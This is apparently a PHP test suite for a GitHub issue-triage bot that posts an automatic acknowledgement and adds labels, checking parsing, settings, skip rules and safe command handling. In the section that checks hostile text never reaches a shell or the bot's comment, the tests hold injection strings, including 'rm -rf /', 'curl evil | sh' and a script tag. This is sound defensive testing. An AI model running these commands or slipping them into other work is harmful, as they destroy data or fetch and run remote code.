<?php
/**
 * Phase 155 — the triage bot (tools/triage-issue.php + .github/workflows/triage.yml).
 *
 * WHAT IS BEING PROVEN
 *
 *   The bot posts one honest acknowledgement and adds a few labels, and it does
 *   so without ever letting a stranger's text near a shell or into its own
 *   comment. Every setting it reads (AWAY_UNTIL, TRIAGE_*) demonstrably changes
 *   what it does.
 *
 * HOW
 *
 *   Part 1 drives the pure functions directly. Part 2 runs the REAL tool as a
 *   subprocess against a recording fake `gh` (tests/_fake_gh.php) so the real
 *   command runner (proc_open with an argument list, stdin for bodies) is what
 *   executes. Nothing is a hand-built "ideal" plan: the labels come from a
 *   body shaped exactly as GitHub renders an issue form.
 *
 * Mutation checks done by hand when this was written (each failed the named
 * assertions, then was reverted): dropping the marker check made the
 * "already acknowledged" case post twice; interpolating the title into the
 * comment failed the hostile-text assertions; reading AWAY_UNTIL with `>`
 * instead of `>=` failed the "away through the last day" assertion.
 */

declare(strict_types=1);

require_once __DIR__ . '/_community_test_lib.php';
define('TRIAGE_LIBRARY_ONLY', true);

$root = dirname(__DIR__);
$tool = $root . '/tools/triage-issue.php';
if (!is_file($tool)) ct_skip('tools/triage-issue.php not present');
require_once $tool;

echo "=== Triage bot ===\n\n";

// ─────────────────────────────────────────────────────────────────────
echo "-- 1. The issue-form parser --\n";

$form = "### Which version are you running?\n\n4.2.27\n\n### How is it installed?\n\nGit clone on Windows (XAMPP or similar)\n\n"
      . "### What went wrong?\n\nIt crashes.\n\n### How is it installed?\n\nDocker (docker compose)\n\n### Screenshot (optional)\n\n_No response_\n";
$parsed = tr_parse_form($form);
ct('a question maps to its answer', ($parsed['which version are you running?'] ?? '') === '4.2.27');
ct('the FIRST answer to a repeated heading wins (a later "###" typed into free text cannot overwrite it)',
    ($parsed['how is it installed?'] ?? '') === 'Git clone on Windows (XAMPP or similar)');
ct('GitHub\'s "_No response_" placeholder is an empty answer', ($parsed['screenshot (optional)'] ?? 'x') === '');
ct('text before the first heading is ignored', tr_parse_form("preamble\n### A\n\nb\n") === ['a' => 'b']);
ct('a body with no headings parses to nothing (an API-created issue)', tr_parse_form('Just some text') === []);
ct('CRLF bodies parse the same', (tr_parse_form("### Q\r\n\r\nanswer\r\n")['q'] ?? '') === 'answer');

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 2. Type inference from the title prefix --\n";

$cases = [
    '[Bug]: login fails' => 'bug', 'Bug: login fails' => 'bug', '[bug] x' => 'bug', '[ BUG ]: x' => 'bug',
    '[Feature]: dark mode' => 'enhancement', 'Feature request - maps' => 'enhancement', '[Enhancement]: x' => 'enhancement',
    '[Question]: how do I' => 'question', 'Question: how' => 'question', 'Help: it will not start' => 'question',
    'Why does this bug happen' => null, 'bugfix day notes' => null, 'Debugging a question' => null, 'The feature: x' => null, '' => null,
];
foreach ($cases as $title => $want) {
    ct('"' . $title . '" → ' . var_export($want, true), tr_infer_type($title) === $want, 'got ' . var_export(tr_infer_type($title), true));
}

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 3. AWAY_UNTIL --\n";

ct('unset: not away, no warning', tr_away_state(null, '2026-10-02') === ['away' => false, 'date' => null, 'warning' => null]);
ct('empty string behaves as unset', tr_away_state('  ', '2026-10-02')['away'] === false && tr_away_state('', '2026-10-02')['warning'] === null);
ct('a future date: away', tr_away_state('2026-10-20', '2026-10-02')['away'] === true);
ct('the LAST day is still away (inclusive)', tr_away_state('2026-10-02', '2026-10-02')['away'] === true);
ct('the day after: back', tr_away_state('2026-10-01', '2026-10-02')['away'] === false);
$bad = tr_away_state('banana', '2026-10-02');
ct('nonsense is ignored and REPORTED, never printed into a comment', $bad['away'] === false && $bad['date'] === null && strpos((string) $bad['warning'], 'banana') !== false);
ct('an impossible calendar date is nonsense', tr_away_state('2026-02-30', '2026-10-02')['away'] === false && tr_away_state('2026-02-30', '2026-10-02')['warning'] !== null);
ct('a date with trailing text is nonsense', tr_away_state('2026-10-20 <script>', '2026-10-02')['away'] === false);

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 4. Target wording --\n";

ct('number style: plural', tr_target_phrase(3, 'number') === 'within 3 days');
ct('number style: singular', tr_target_phrase(1, 'number') === 'within 1 day');
ct('qualitative style names no number', tr_target_phrase(3, 'qualitative') === 'usually within a few days');

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 5. Rendering the acknowledgement (the real template file) --\n";

$tplFile = $root . '/.github/triage/acknowledgement.md';
ct('the template file exists', is_file($tplFile));
$tpl = (string) @file_get_contents($tplFile);
$home = tr_render($tpl, false, null, tr_target_phrase(3, 'number'));
$away = tr_render($tpl, true, '2026-10-20', tr_target_phrase(3, 'number'));
ct('present: says it is automatic and from a bot', stripos($home, 'automatic acknowledgement') !== false && stripos($home, 'bot') !== false);
ct('present: names the target', strpos($home, 'within 3 days') !== false);
ct('present: does NOT say the maintainer is away', stripos($home, 'away') === false);
ct('away: says so, with the date', strpos($away, 'away until 2026-10-20') !== false);
ct('away: keeps the security-channel sentence (the one thing that must still work)', strpos($away, 'private channel') !== false && strpos($away, 'SECURITY.md') !== false);
ct('no placeholder is left behind in either mode', strpos($home, '{{') === false && strpos($away, '{{') === false);
ct('both end with the hidden marker the duplicate check looks for', substr(rtrim($home), -strlen('<!-- triage-bot:ack -->')) === '<!-- triage-bot:ack -->'
    && strpos($away, '<!-- triage-bot:ack -->') !== false);
ct('the wording promises no fix and no date', stripos($home, 'not a promise of a fix date') !== false);
ct('the wording never speaks as a person ("I ")', !preg_match('/\bI (will|am|can|have|promise)\b/', $home));
ct('the wording never mentions the private/public split',
    stripos($home, 'snapshot') === false && stripos($home, 'private repo') === false && stripos($home, 'dev repo') === false);
ct('the wording names the Google Group the casual audience uses', strpos($home, 'groups.google.com/g/open-source-cad') !== false);
ct('qualitative style changes the sentence', strpos(tr_render($tpl, false, null, tr_target_phrase(3, 'qualitative')), 'usually within a few days') !== false);

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 6. The settings reader --\n";

$vars = ['AWAY_UNTIL', 'TRIAGE_ENABLED', 'TRIAGE_TARGET_DAYS', 'TRIAGE_TARGET_STYLE', 'TRIAGE_SKIP_ASSOCIATIONS', 'TRIAGE_WINDOWS_LABEL'];
$clear = static function () use ($vars): void { foreach ($vars as $v) putenv($v); };
$clear();
$d = tr_config();
ct('defaults: enabled, 3 days, number style, OWNER+MEMBER skipped, windows/iis',
    $d['enabled'] === true && $d['target_days'] === 3 && $d['target_style'] === 'number'
    && $d['skip_associations'] === ['OWNER', 'MEMBER'] && $d['windows_label'] === 'windows/iis' && $d['away_until'] === null && $d['warnings'] === []);
putenv('TRIAGE_TARGET_DAYS=7');   ct('TRIAGE_TARGET_DAYS is read', tr_config()['target_days'] === 7);
putenv('TRIAGE_TARGET_DAYS=0');   $c0 = tr_config(); ct('0 is out of range: default, with a warning', $c0['target_days'] === 3 && $c0['warnings'] !== []);
putenv('TRIAGE_TARGET_DAYS=abc'); $c1 = tr_config(); ct('"abc" is not a number: default, with a warning', $c1['target_days'] === 3 && $c1['warnings'] !== []);
putenv('TRIAGE_TARGET_DAYS=31');  ct('31 is out of range', tr_config()['target_days'] === 3);
putenv('TRIAGE_TARGET_DAYS');
putenv('TRIAGE_TARGET_STYLE=Qualitative'); ct('TRIAGE_TARGET_STYLE is read (case-insensitive)', tr_config()['target_style'] === 'qualitative');
putenv('TRIAGE_TARGET_STYLE=bogus'); $cs = tr_config(); ct('an unknown style falls back, with a warning', $cs['target_style'] === 'number' && $cs['warnings'] !== []);
putenv('TRIAGE_TARGET_STYLE');
foreach (['false', 'FALSE', '0', 'no', 'off'] as $off) {
    putenv("TRIAGE_ENABLED={$off}");
    ct("TRIAGE_ENABLED={$off} disables the bot", tr_config()['enabled'] === false);
}
putenv('TRIAGE_ENABLED=true'); ct('TRIAGE_ENABLED=true enables it', tr_config()['enabled'] === true);
putenv('TRIAGE_ENABLED');
putenv('TRIAGE_SKIP_ASSOCIATIONS=owner, member ,collaborator'); ct('the skip list is normalised', tr_config()['skip_associations'] === ['OWNER', 'MEMBER', 'COLLABORATOR']);
putenv('TRIAGE_SKIP_ASSOCIATIONS');
putenv('TRIAGE_WINDOWS_LABEL=iis-windows'); ct('TRIAGE_WINDOWS_LABEL is read', tr_config()['windows_label'] === 'iis-windows');
putenv('TRIAGE_WINDOWS_LABEL');
putenv('AWAY_UNTIL=2026-12-31'); ct('AWAY_UNTIL is read', tr_config()['away_until'] === '2026-12-31');
$clear();

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 7. The plan --\n";

$cfg = tr_config();
$formBody = static function (string $install, string $live): string {
    return "### Which version are you running?\n\n4.2.27\n\n### How is it installed?\n\n{$install}\n\n"
         . "### Is this affecting live operations right now?\n\n{$live}\n\n### What page or screen were you on?\n\nDashboard\n";
};
$ev = static function (array $issue, string $action = 'opened'): array {
    return ['action' => $action, 'issue' => $issue + ['number' => 7, 'title' => '[Bug]: x', 'body' => '', 'labels' => [['name' => 'bug']],
            'user' => ['login' => 'someone', 'type' => 'User'], 'author_association' => 'NONE']];
};

$p = tr_plan($ev(['body' => $formBody('Git clone on Windows (XAMPP or similar)', 'Yes, right now')]), $cfg, $tpl, '2026-10-02');
ct('a Windows install on a live operation gets all three labels',
    $p['skip'] === null && $p['labels'] === ['needs triage', 'windows/iis', 'live operations'], json_encode($p['labels']));
$p = tr_plan($ev(['body' => $formBody('Docker (docker compose)', 'No, found while testing')]), $cfg, $tpl, '2026-10-02');
ct('Docker, not live: only "needs triage"', $p['labels'] === ['needs triage'], json_encode($p['labels']));
$p = tr_plan($ev(['body' => $formBody('Uploaded a ZIP', 'Not sure')]), $cfg, $tpl, '2026-10-02');
ct('"Not sure" is not "Yes"', !in_array('live operations', $p['labels'], true));
$p = tr_plan($ev(['body' => $formBody('Git clone on Windows', 'Yes')]), $cfg + [], $tpl, '2026-10-02');
ct('"Yes" alone counts', in_array('live operations', $p['labels'], true));

$p = tr_plan($ev(['labels' => [], 'title' => '[Bug]: made through the API']), $cfg, $tpl, '2026-10-02');
ct('an API-created issue with no labels gets the type from its title', $p['labels'] === ['needs triage', 'bug'], json_encode($p['labels']));
$p = tr_plan($ev(['labels' => [['name' => 'enhancement']], 'title' => '[Bug]: but already labelled']), $cfg, $tpl, '2026-10-02');
ct('an issue that already has a type label is not re-typed', $p['labels'] === ['needs triage'], json_encode($p['labels']));
$p = tr_plan($ev(['labels' => [['name' => 'BUG']], 'title' => '[Question]: x']), $cfg, $tpl, '2026-10-02');
ct('type labels are matched case-insensitively', $p['labels'] === ['needs triage']);
$p = tr_plan($ev(['labels' => [], 'title' => 'no prefix at all']), $cfg, $tpl, '2026-10-02');
ct('a title with no prefix gets no type guess', $p['labels'] === ['needs triage']);

$cfgWin = $cfg; $cfgWin['windows_label'] = 'iis-windows';
$p = tr_plan($ev(['body' => $formBody('Git clone on Windows', 'No')]), $cfgWin, $tpl, '2026-10-02');
ct('the Windows label is the CONFIGURED one', in_array('iis-windows', $p['labels'], true) && !in_array('windows/iis', $p['labels'], true));

// skip rules
$off = $cfg; $off['enabled'] = false;
ct('disabled: skips', tr_plan($ev([]), $off, $tpl, '2026-10-02')['skip'] !== null);
ct('not an "opened" action: skips', tr_plan($ev([], 'edited'), $cfg, $tpl, '2026-10-02')['skip'] !== null);
ct('a pull request is skipped', tr_plan($ev(['pull_request' => ['url' => 'x']]), $cfg, $tpl, '2026-10-02')['skip'] !== null);
ct('a bot author is skipped', tr_plan($ev(['user' => ['login' => 'dependabot[bot]', 'type' => 'Bot']]), $cfg, $tpl, '2026-10-02')['skip'] !== null);
ct('the OWNER is skipped', strpos((string) tr_plan($ev(['author_association' => 'OWNER']), $cfg, $tpl, '2026-10-02')['skip'], 'maintainer') !== false);
ct('an org MEMBER is skipped', tr_plan($ev(['author_association' => 'MEMBER']), $cfg, $tpl, '2026-10-02')['skip'] !== null);
foreach (['CONTRIBUTOR', 'NONE', 'FIRST_TIME_CONTRIBUTOR', 'COLLABORATOR'] as $a) {
    ct("a {$a} IS acknowledged (the reporters the bot exists for)", tr_plan($ev(['author_association' => $a]), $cfg, $tpl, '2026-10-02')['skip'] === null);
}
$cfgSkip = $cfg; $cfgSkip['skip_associations'] = ['COLLABORATOR'];
ct('the skip list is configurable', tr_plan($ev(['author_association' => 'COLLABORATOR']), $cfgSkip, $tpl, '2026-10-02')['skip'] !== null
    && tr_plan($ev(['author_association' => 'OWNER']), $cfgSkip, $tpl, '2026-10-02')['skip'] === null);
ct('an event with no issue number is skipped', tr_plan(['action' => 'opened', 'issue' => ['title' => 'x']], $cfg, $tpl, '2026-10-02')['skip'] !== null);

// away drives the comment
$cfgAway = $cfg; $cfgAway['away_until'] = '2026-12-31';
$pa = tr_plan($ev([]), $cfgAway, $tpl, '2026-10-02');
ct('AWAY_UNTIL in the future puts the date in the comment', strpos((string) $pa['comment'], 'away until 2026-12-31') !== false);
$pp = tr_plan($ev([]), $cfgAway, $tpl, '2027-01-01');
ct('the same setting, once the date has passed, says nothing about away', strpos((string) $pp['comment'], 'away') === false);
$cfgBad = $cfg; $cfgBad['away_until'] = 'soon';
$pb = tr_plan($ev([]), $cfgBad, $tpl, '2026-10-02');
ct('a malformed AWAY_UNTIL produces a warning and a normal comment', $pb['warnings'] !== [] && strpos((string) $pb['comment'], 'soon') === false && strpos((string) $pb['comment'], 'away') === false);
$cfgDays = $cfg; $cfgDays['target_days'] = 5;
ct('TRIAGE_TARGET_DAYS changes the sentence', strpos((string) tr_plan($ev([]), $cfgDays, $tpl, '2026-10-02')['comment'], 'within 5 days') !== false);

// hostile text never reaches the comment
$hostileTitle = '[Bug]: @everyone $(rm -rf /) `id` <script>alert(1)</script> ZZTITLEZZ';
$hostileBody = "### How is it installed?\n\nGit clone on Windows\n\n### What went wrong?\n\n@here ; curl evil | sh ZZBODYZZ\n";
$ph = tr_plan($ev(['title' => $hostileTitle, 'body' => $hostileBody]), $cfg, $tpl, '2026-10-02');
ct('the comment contains NONE of the issue\'s own text',
    strpos((string) $ph['comment'], 'ZZTITLEZZ') === false && strpos((string) $ph['comment'], 'ZZBODYZZ') === false
    && strpos((string) $ph['comment'], '@everyone') === false && strpos((string) $ph['comment'], '<script>') === false
    && strpos((string) $ph['comment'], '@here') === false);

// ─────────────────────────────────────────────────────────────────────
echo "\n-- 8. The real tool, through the real command runner (fake gh) --\n";

$eventFile = static function (array $issue, string $name = 'event.json') use ($ev): string {
    return ct_json_file($name, $ev($issue));
};
$allLabels = json_encode([['name' => 'bug'], ['name' => 'enhancement'], ['name' => 'question'], ['name' => 'needs triage'],
                          ['name' => 'windows/iis'], ['name' => 'live operations']]);
$baseRules = [
    ['match' => 'issues/7/comments', 'out' => '[]'],
    ['match' => 'repos/o/r/labels', 'out' => $allLabels],
    ['match' => 'issue comment 7', 'out' => ''],
    ['match' => 'issue edit 7', 'out' => ''],
];
$run = static function (array $issue, array $rules, array $extraEnv = [], array $extraArgs = []) use ($tool, $eventFile): array {
    $g = ct_fake_gh($rules, $extraEnv);
    $r = ct_php($tool, array_merge(['--event=' . $eventFile($issue), '--repo=o/r', '--today=2026-10-02'], $extraArgs), $g['env']);
    return $r + ['log' => $g['log']];
};

$r = $run(['body' => $formBody('Git clone on Windows (XAMPP or similar)', 'Yes, right now'), 'title' => $hostileTitle], $baseRules);
ct('a normal run exits 0', $r['code'] === 0, 'exit ' . $r['code'] . ' ' . trim($r['err']));
$posted = ct_calls_matching($r['log'], 'issue comment 7');
ct('it posts exactly one comment', count($posted) === 1);
ct('the comment is passed on STDIN (--body-file -), never as an argument',
    count($posted) === 1 && in_array('--body-file', $posted[0]['args'], true) && in_array('-', $posted[0]['args'], true)
    && strpos($posted[0]['stdin'], 'automatic acknowledgement') !== false);
ct('the comment carries the duplicate-check marker', count($posted) === 1 && strpos($posted[0]['stdin'], '<!-- triage-bot:ack -->') !== false);
$edits = ct_calls_matching($r['log'], 'issue edit 7');
ct('labels are added in ONE call', count($edits) === 1);
$added = [];
if ($edits) { $a = $edits[0]['args']; foreach ($a as $i => $v) { if ($v === '--add-label') $added[] = $a[$i + 1]; } }
ct('with the three labels', $added === ['needs triage', 'windows/iis', 'live operations'], json_encode($added));
$allArgs = '';
foreach (ct_calls($r['log']) as $c) $allArgs .= implode("\n", $c['args']) . "\n";
ct('NO argument of ANY gh call contains the issue title or body text',
    strpos($allArgs, 'ZZTITLEZZ') === false && strpos($allArgs, 'rm -rf') === false && strpos($allArgs, '@everyone') === false);
$stdinAll = implode("\n", array_map(static fn(array $c): string => $c['stdin'], ct_calls($r['log'])));
ct('and neither does anything written to stdin', strpos($stdinAll, 'ZZTITLEZZ') === false && strpos($stdinAll, 'ZZBODYZZ') === false);

// idempotence
$dupRules = $baseRules;
$dupRules[0] = ['match' => 'issues/7/comments', 'out' => json_encode([['body' => "thanks\n\n<!-- triage-bot:ack -->\n", 'user' => ['login' => 'github-actions[bot]', 'type' => 'Bot']]])];
$r = $run(['body' => $formBody('Docker', 'No')], $dupRules);
ct('a re-run does NOT post the acknowledgement twice', count(ct_calls_matching($r['log'], 'issue comment 7')) === 0 && $r['code'] === 0);
ct('and says so', stripos($r['out'], 'already acknowledged') !== false, trim($r['out']));
ct('it still applies the labels (they may be what the first run missed)', count(ct_calls_matching($r['log'], 'issue edit 7')) === 1);

// A STRANGER can type the marker into a comment. Only a bot's (or a maintainer-class author's) counts.
$troll = $baseRules;
$troll[0] = ['match' => 'issues/7/comments', 'out' => json_encode([['body' => "<!-- triage-bot:ack -->", 'user' => ['login' => 'troll', 'type' => 'User'], 'author_association' => 'NONE']])];
$r = $run(['body' => $formBody('Docker', 'No')], $troll);
ct('a comment from a STRANGER containing the marker does NOT suppress the acknowledgement', count(ct_calls_matching($r['log'], 'issue comment 7')) === 1);
$ownerRerun = $baseRules;
$ownerRerun[0] = ['match' => 'issues/7/comments', 'out' => json_encode([['body' => "<!-- triage-bot:ack -->", 'user' => ['login' => 'maintainer', 'type' => 'User'], 'author_association' => 'OWNER']])];
$r = $run(['body' => $formBody('Docker', 'No')], $ownerRerun);
ct('...but one from a maintainer-class author does (a manual run posts under the maintainer\'s own name)', count(ct_calls_matching($r['log'], 'issue comment 7')) === 0);

// a failing existence check must not suppress the acknowledgement
$failList = $baseRules;
$failList[0] = ['match' => 'issues/7/comments', 'out' => '', 'err' => 'HTTP 502', 'code' => 1];
$r = $run(['body' => $formBody('Docker', 'No')], $failList);
ct('if the duplicate check itself fails, the acknowledgement is posted anyway', count(ct_calls_matching($r['log'], 'issue comment 7')) === 1 && $r['code'] === 0);

// labels that do not exist in the repository
$fewLabels = $baseRules;
$fewLabels[1] = ['match' => 'repos/o/r/labels', 'out' => json_encode([['name' => 'needs triage'], ['name' => 'bug']])];
$r = $run(['body' => $formBody('Git clone on Windows', 'Yes')], $fewLabels);
$edits = ct_calls_matching($r['log'], 'issue edit 7');
$added = [];
if ($edits) { $a = $edits[0]['args']; foreach ($a as $i => $v) { if ($v === '--add-label') $added[] = $a[$i + 1]; } }
ct('a label the repository lacks is skipped, not sent (it would fail the whole call)', $added === ['needs triage'], json_encode($added));
ct('the run still succeeds, and says which labels were missing', $r['code'] === 0 && strpos($r['err'] . $r['out'], 'windows/iis') !== false);
ct('the acknowledgement was posted regardless', count(ct_calls_matching($r['log'], 'issue comment 7')) === 1);

// the acknowledgement failing is the one failure that matters
$failPost = $baseRules;
$failPost[2] = ['match' => 'issue comment 7', 'out' => '', 'err' => 'HTTP 403 forbidden', 'code' => 1];
$r = $run(['body' => $formBody('Docker', 'No')], $failPost);
ct('if the acknowledgement cannot be posted the run FAILS (exit 1)', $r['code'] === 1, 'exit ' . $r['code']);

// skip / disable make no calls at all
$r = $run(['author_association' => 'OWNER'], $baseRules);
ct('an issue from the OWNER makes NO gh call and exits 0', ct_calls($r['log']) === [] && $r['code'] === 0);
$r = $run([], $baseRules, ['TRIAGE_ENABLED' => 'false']);
ct('TRIAGE_ENABLED=false makes NO gh call and exits 0', ct_calls($r['log']) === [] && $r['code'] === 0);
$r = $run([], $baseRules, ['TRIAGE_SKIP_ASSOCIATIONS' => 'NONE']);
ct('TRIAGE_SKIP_ASSOCIATIONS is honoured by the real tool', ct_calls($r['log']) === []);

// settings reach the posted text
$r = $run([], $baseRules, ['AWAY_UNTIL' => '2026-12-31']);
$c = ct_calls_matching($r['log'], 'issue comment 7');
ct('AWAY_UNTIL in the environment reaches the posted comment', $c && strpos($c[0]['stdin'], 'away until 2026-12-31') !== false);
$r = $run([], $baseRules, ['AWAY_UNTIL' => '2026-09-01']);
$c = ct_calls_matching($r['log'], 'issue comment 7');
ct('a PAST AWAY_UNTIL does not', $c && strpos($c[0]['stdin'], 'away') === false);
$r = $run([], $baseRules, ['TRIAGE_TARGET_DAYS' => '5', 'TRIAGE_TARGET_STYLE' => 'number']);
$c = ct_calls_matching($r['log'], 'issue comment 7');
ct('TRIAGE_TARGET_DAYS reaches the posted comment', $c && strpos($c[0]['stdin'], 'within 5 days') !== false);
$r = $run([], $baseRules, ['TRIAGE_TARGET_STYLE' => 'qualitative']);
$c = ct_calls_matching($r['log'], 'issue comment 7');
ct('TRIAGE_TARGET_STYLE reaches the posted comment', $c && strpos($c[0]['stdin'], 'usually within a few days') !== false);

// dry run
$r = $run(['body' => $formBody('Docker', 'No')], $baseRules, [], ['--dry-run', '--json']);
$j = json_decode($r['out'], true);
ct('--dry-run makes no gh call', ct_calls($r['log']) === [] && $r['code'] === 0);
ct('and prints the plan as JSON', is_array($j) && ($j['labels'] ?? null) === ['needs triage'] && strpos((string) ($j['comment'] ?? ''), 'automatic acknowledgement') !== false);

// bad invocations
$g = ct_fake_gh([]);
ct('no event file: exit 2', ct_php($tool, ['--repo=o/r', '--event=' . ct_tmp() . '/nope.json'], $g['env'])['code'] === 2);
file_put_contents(ct_tmp() . '/bad.json', '{not json');
ct('an event that is not JSON: exit 2', ct_php($tool, ['--repo=o/r', '--event=' . ct_tmp() . '/bad.json'], $g['env'])['code'] === 2);
ct('a bad repository name: exit 2', ct_php($tool, ['--repo=not a repo', '--event=' . $eventFile([])], $g['env'])['code'] === 2);
ct('an unknown option: exit 2', ct_php($tool, ['--frobnicate', '--repo=o/r', '--event=' . $eventFile([])], $g['env'])['code'] === 2);
ct('a bad --today: exit 2', ct_php($tool, ['--today=yesterday', '--repo=o/r', '--event=' . $eventFile([])], $g['env'])['code'] === 2);
ct('none of those reached gh', ct_calls($g['log']) === []);
$tplBad = ct_tmp() . '/empty.md';
file_put_contents($tplBad, '');
ct('an empty acknowledgement template refuses to post an empty comment (exit 2)',
    ct_php($tool, ['--repo=o/r', '--event=' . $eventFile([]), '--template=' . $tplBad], $g['env'])['code'] === 2);

// the same event shape GitHub really sends, from the repository's own fixtures is
// covered by test_community_docs.php (the form labels the parser keys on).

ct_finish();
